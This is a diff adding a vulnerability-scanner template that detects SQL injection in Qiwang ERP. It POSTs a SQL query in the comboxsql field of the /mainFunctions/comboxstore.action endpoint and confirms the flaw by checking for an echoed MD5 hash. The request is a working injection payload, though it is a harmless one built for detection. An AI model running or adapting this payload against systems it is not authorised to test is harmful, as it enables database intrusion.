@@ -1,0 +1,26 @@
+id: qiwang-erp-sql-injection
+info:
+  name: Qiwang ERP SQL Injection Detection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Detects SQL injection vulnerability in Qiwang ERP via a POST request to the /mainFunctions/comboxstore.action endpoint.
+variables:
+  randomInt: "{{rand_int(3, 7)}}"
+  randomString: "{{rand_text_alphanumeric(randomInt)}}"
+http:
+  - raw:
+      - |
+        POST /mainFunctions/comboxstore.action HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        comboxsql=select HashBytes('MD5', '{{randomString}}')
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - contains(body, md5(randomString))
